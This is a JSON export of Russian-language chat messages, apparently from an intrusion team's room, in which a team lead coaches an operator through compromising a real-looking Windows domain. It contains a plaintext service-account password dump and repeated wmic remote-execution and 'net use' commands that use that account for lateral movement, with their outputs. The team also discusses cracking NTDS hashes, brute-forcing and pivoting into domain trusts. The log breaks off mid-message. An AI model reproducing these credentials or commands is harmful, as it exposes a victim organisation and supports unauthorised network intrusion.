@@ -1,0 +1,1404 @@
+{
+  "messages": [
+    {
+      "_id": "QivLmMvihpCjTuKrP",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "результаты: найдены креды ЕА, ведутся попытки пролезть в трасты для продолжения работы",
+      "ts": "2020-12-15T17:57:42.272Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:57:42.311Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "EnFsYAueCAFdc7Wnj",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "10.10.30.24",
+      "ts": "2020-12-15T17:49:32.739Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:49:32.783Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jdCDTacfPzprmiNbF",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "что за Z?",
+      "ts": "2020-12-15T17:49:20.145Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:49:20.188Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YPKdZT35KoNLnf68k",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nC:\\Users\\wevvewe\\Desktop>wmic /node:10.10.30.24 /user:\"lrhc.local\\svc-aadc\" /password:\"WH20s.admin 1225kofq\" process call create \"cmd /c net use * \\\\192.168.254.107\\C$ \"\"WH20s.admin 1225kofq\"\" /user:lrhc.local\\svc-aadc > C:\\ProgramData\\nts.txt && copy C:\\ProgramData\\nts.txt \\\\10.10.30.24\\C$\\ProgramData\\nts.txt\"\nExecuting (Win32_Process)->Create()\nMethod execution successful.\nOut Parameters:\ninstance of __PARAMETERS\n{\n        ProcessId = 3428;\n        ReturnValue = 0;\n};\n\n\nC:\\Users\\wevvewe\\Desktop>dir Z:\\ProgramData\\nts.txt\n Volume in drive Z has no label.\n Volume Serial Number is 584E-4F0A\n\n Directory of Z:\\ProgramData\n\n12/15/2020  12:48 PM                 0 nts.txt\n               1 File(s)              0 bytes\n               0 Dir(s)   4,098,580,480 bytes free\n```",
+      "ts": "2020-12-15T17:48:38.097Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:48:38.242Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rcmioyMNhnpG4eg4f",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "0 байт",
+      "ts": "2020-12-15T17:48:17.047Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:48:17.091Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hm5Qvu4vYoAL4L52y",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "а может",
+      "ts": "2020-12-15T17:44:26.859Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:44:26.887Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XFh5PpmcWLSWfuCgE",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "а может сделаешь нет юз с прямым указанием кред и выводо в файл чтобы магией не заниматься?",
+      "ts": "2020-12-15T17:42:55.093Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:42:55.127Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4u94apyZXobTW6MAo",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nC:\\Users\\wevvewe\\Desktop>wmic /node:10.10.30.24 /user:\"lrhc.local\\svc-aadc\" /password:\"WH20s.admin 1225kofq\" process call create \"cmd /c net use > C:\\ProgramData\\eula_en.txt && copy C:\\ProgramData\\eula_un.txt \\\\10.10.30.24\\C$\\ProgramData\\eula_en.txt\"\nExecuting (Win32_Process)->Create()\nMethod execution successful.\nOut Parameters:\ninstance of __PARAMETERS\n{\n        ProcessId = 5588;\n        ReturnValue = 0;\n};\n``` \n\n```\nC:\\Users\\wevvewe\\Desktop>type Z:\\ProgramData\\eula_en.txt\nNew connections will be remembered.\n\nThere are no entries in the list.\n```",
+      "ts": "2020-12-15T17:42:24.986Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:42:25.112Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HEZ4riW4FWnEEhwvv",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nC:\\Users\\wevvewe\\Desktop>wmic /node:10.       10.30. 24 /user:\"lrhc.local\\svc-aadc\" /password:\"WH20s.admin 1225kofq\" process call create \"cmd /c net use * \\\\192.168.254.107\\C$\"\nExecuting (Win32_Process)->Create()\nMethod execution successful.\nOut Parameters:\ninstance of __PARAMETERS\n{\n        ProcessId = 7036;\n        ReturnValue = 0;\n};\n```",
+      "ts": "2020-12-15T17:38:49.607Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:38:57.225Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-12-15T17:38:57.224Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "KBxHdjTRzBDRZg7i9",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "тогда пароль)",
+      "ts": "2020-12-15T17:38:38.451Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:38:38.488Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2j7EvYG8fpStHwghY",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "[ ](https://mediaeveryone.com/group/lrhc-org?msg=mb5ncYh6KZCcgbf4a) получилось вот так",
+      "ts": "2020-12-15T17:38:18.718Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:38:18.766Z",
+      "attachments": [
+        {
+          "text": "напиши ип так `\"10.       10.30. 24\"`",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/lrhc-org?msg=mb5ncYh6KZCcgbf4a",
+          "attachments": [],
+          "ts": "2020-12-15T17:37:46.456Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/lrhc-org?msg=mb5ncYh6KZCcgbf4a",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FWmRiLWSfPdk4ceLi",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "всё",
+      "ts": "2020-12-15T17:38:09.267Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:38:09.304Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hRTJKAHi9E76ZB8Rc",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "разница будет?",
+      "ts": "2020-12-15T17:38:00.709Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:38:00.748Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mb5ncYh6KZCcgbf4a",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "напиши ип так `\"10.       10.30. 24\"`",
+      "ts": "2020-12-15T17:37:46.456Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:37:53.170Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-12-15T17:37:53.167Z",
+      "editedBy": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1"
+      },
+      "urls": []
+    },
+    {
+      "_id": "MGjs2m5qQqizQ42vG",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "бл",
+      "ts": "2020-12-15T17:37:44.189Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:37:44.224Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Fcnw3CfAbxBHBbGbz",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "...",
+      "ts": "2020-12-15T17:37:33.543Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:37:33.587Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "smzv5d6ZaTQPB4833",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nC:\\Users\\wevvewe\\Desktop>wmic /node:10.10.30.24 /user:\"lrhc.local\\svc-aadc \"/password:\"WH20s.admin 1225kofq\" process call create \"cmd /c net use * \\\\192.168.254.107\\C$\"\nERROR:\nDescription = Access is denied.\n```",
+      "ts": "2020-12-15T17:37:21.101Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:37:21.178Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3MJ9iqLa6eHMdWJfn",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "он мне на разные команды давал инвалида",
+      "ts": "2020-12-15T17:36:40.205Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:36:40.235Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jtF4MyknaGjgWeSEA",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "в кавычки возьми логин пользака",
+      "ts": "2020-12-15T17:36:33.991Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:36:34.021Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zRFLWDMt2fgYzHyoS",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "стоп",
+      "ts": "2020-12-15T17:36:31.853Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:36:31.886Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "r8tSL2SZANqpHBGWf",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nC:\\Users\\wevvewe\\Desktop>wmic /node:10.10.30.24 /user:lrhc.local\\svc-aadc /password:\"WH20s.admin 1225kofq\" process call create \"cmd /c net use * \\\\192.168.254.107\\C$\"\n```",
+      "ts": "2020-12-15T17:36:15.723Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:36:15.801Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MEEJS3SdRQPh9WG8b",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "не знаю",
+      "ts": "2020-12-15T17:36:12.445Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:36:12.477Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "adL2abdG3i36zhmJq",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "у меня имя \"ванга\"?",
+      "ts": "2020-12-15T17:36:07.141Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:36:07.186Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PgmwYe59Xr2TyeQcA",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nInvalid Global Switch.\n```",
+      "ts": "2020-12-15T17:35:35.485Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:35:35.542Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZBJ57NLmujG3yDrhQ",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "попробуй через вмик с внутренней тачки",
+      "ts": "2020-12-15T17:20:58.837Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:20:58.871Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2M8zpdNMMfb3iYT4X",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "со вторым та же беда",
+      "ts": "2020-12-15T17:18:35.349Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:18:35.386Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sbmyAEeRsJEQ76cik",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "это я в траст стукнулся",
+      "ts": "2020-12-15T17:17:33.518Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:17:33.566Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rfuwEaXHCAnb5YJ96",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "как ни срачка, так болячка",
+      "ts": "2020-12-15T17:17:16.339Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:17:16.369Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "c8fu6hPMj4kwETChP",
+      "rid": "CD3unmS5YbWcpczbh",
+      "ts": "2020-12-15T17:17:10.466Z",
+      "msg": "",
+      "file": {
+        "_id": "PLfJz7GnfC66Qqypz",
+        "name": "аыаыа",
+        "type": "image/png"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "аыаыа",
+          "title_link": "/file-upload/PLfJz7GnfC66Qqypz/%D0%B0%D1%8B%D0%B0%D1%8B%D0%B0",
+          "title_link_download": true,
+          "image_dimensions": {
+            "width": 891,
+            "height": 123
+          },
+          "image_preview": "/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAEACADASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAMI/8QAGRAAAwADAAAAAAAAAAAAAAAAAAECESEx/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AM+uVgjUSk2ABF9FSqW0AB//2Q==",
+          "image_url": "/file-upload/PLfJz7GnfC66Qqypz/%D0%B0%D1%8B%D0%B0%D1%8B%D0%B0",
+          "image_type": "image/png",
+          "image_size": 11232,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:17:10.496Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rHr6T75Dg4o26Lmsu",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "просто я думал мб вывод покосился",
+      "ts": "2020-12-15T17:15:05.250Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:15:05.282Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mkqJHXjS5A48keJST",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "это пароль с пробелом",
+      "ts": "2020-12-15T17:14:36.640Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:14:36.676Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "waQJLGBB8gWPoeWER",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "по хешу сравни",
+      "ts": "2020-12-15T17:09:41.473Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:09:41.507Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5TjcpjE3DH6t5nHZD",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": ")))",
+      "ts": "2020-12-15T17:09:36.038Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T17:09:36.079Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "b7mPFXCPXNRGGBxy7",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "только не ясно это с пробелом пароль или че",
+      "ts": "2020-12-15T17:06:09.871Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:06:09.904Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yPtES2shGabYd59Gn",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nUsername  Domain      Password\n--------  ------      --------\nsvc-aadc  lrhc.local  WH20s.admin 1225kofq\n``` \nвот он ебучий вонючий",
+      "ts": "2020-12-15T17:05:35.685Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T17:05:35.761Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "QavcqhASknox7cqrL",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "все Not Found",
+      "ts": "2020-12-15T16:32:22.395Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:32:22.441Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DcufFYyNokxyz87GA",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "так блять скинь хеш я дам клир",
+      "ts": "2020-12-15T16:31:01.314Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:31:01.357Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PbZgd3v5arCNiLNtu",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "всё понял",
+      "ts": "2020-12-15T16:31:00.321Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:31:00.348Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oaQimD47FYmCvKuXg",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "чтобы увидеть клир надо купить",
+      "ts": "2020-12-15T16:30:56.610Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:30:56.657Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Y4ck4zRQay6GB4FFN",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "а",
+      "ts": "2020-12-15T16:30:53.385Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:30:53.415Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jzDiPcP9fHhuyd7tQ",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "проверка бесплатная",
+      "ts": "2020-12-15T16:30:49.758Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:30:49.796Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tQtBZFsg3Lj2BXiDM",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "вот щас уже не смешно",
+      "ts": "2020-12-15T16:30:42.926Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:30:42.988Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "y3Cv2Shve4DvuigA6",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "кто был залогинен",
+      "ts": "2020-12-15T16:30:34.843Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:30:34.872Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tqu8HzFfEM4PYiCds",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "он у нас у всех вылетел из акка",
+      "ts": "2020-12-15T16:30:29.729Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:30:29.753Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MKjqyfbMLi46Y2yNB",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "так вы там сменили логины пароли",
+      "ts": "2020-12-15T16:30:02.349Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:30:02.381Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2682YJo5GKSz7oWBN",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "дописать 5.com",
+      "ts": "2020-12-15T16:29:50.948Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:29:50.995Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ko3jxQpmhSCk7sLmD",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "а как мне прочекать тогда из кмд хэш?",
+      "ts": "2020-12-15T16:29:37.797Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:29:37.850Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "JAqphGAQwpLJHNkdQ",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "просто он как бы 0...",
+      "ts": "2020-12-15T16:29:10.329Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:29:10.378Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oS7CRzW76fvjna2qP",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "я бы дал",
+      "ts": "2020-12-15T16:29:06.535Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:29:06.596Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YFbwXsybHK49b3Atg",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "я нет юзом прочекаю",
+      "ts": "2020-12-15T16:28:31.601Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:28:31.645Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "96ThntsaRpDQYrZ82",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "можешь проще дать файлик с клиртекстами из ntds?",
+      "ts": "2020-12-15T16:28:19.872Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:28:19.914Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kwXEqq3NxMRRJyqKh",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "пробрутить хочу",
+      "ts": "2020-12-15T16:24:12.581Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:24:12.654Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Cmr3PwPoqzW9PQp3Z",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "я не понимаю что ты делаешь)",
+      "ts": "2020-12-15T16:24:01.785Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:24:01.838Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "saJF9yR3Cc7szTwAE",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "вот этот хэши сожрёт?",
+      "ts": "2020-12-15T16:23:31.927Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:23:31.956Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "udFFCccZY9fMFYjx2",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/smblogin.ps1",
+      "ts": "2020-12-15T16:23:25.159Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:23:25.204Z",
+      "urls": [
+        {
+          "url": "https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/smblogin.ps1"
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tcnQ5BYeQQKHTwYMw",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "ага..\nа как в мсф проксю кинуть без кобы?)",
+      "ts": "2020-12-15T16:22:32.758Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:22:32.800Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oAcPTJaPEwvNoPM2g",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "а стоп ща",
+      "ts": "2020-12-15T16:19:07.056Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:19:07.093Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dbTsSZCgNzPz5fMB3",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "хеши",
+      "ts": "2020-12-15T16:18:45.814Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:18:45.860Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "QK7H2jAseHyqE9LgL",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "что именно то прочекать?",
+      "ts": "2020-12-15T16:18:37.594Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:18:37.641Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LEikQXtGjzgoaAPaj",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "так ты прочекал?",
+      "ts": "2020-12-15T16:18:00.662Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
